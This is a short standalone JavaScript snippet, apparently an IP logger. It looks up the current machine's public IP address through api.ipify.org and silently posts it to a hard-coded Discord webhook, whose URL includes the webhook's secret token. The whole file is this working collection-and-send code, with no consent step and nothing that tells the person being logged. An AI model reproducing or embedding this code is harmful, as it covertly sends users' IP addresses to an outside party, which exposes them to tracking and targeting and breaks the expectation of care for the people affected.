fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const ip = data.ip;
    const webhookUrl = 'https://discord.com/api/webhooks/1283800599321776148/aQ6bqNSiG7m0gVi_CrayUPmCMXrf4pZU3QFP-37aUrGJkdmUK_4Ir0fEmdoorbLFhuP7';

    const payload = JSON.stringify({
      content: `${ip}`
    });

    fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: payload
    })
    .then(response => {
      console.log('success');
    })
    .catch(error => {
      console.error('error', error);
    });
  });
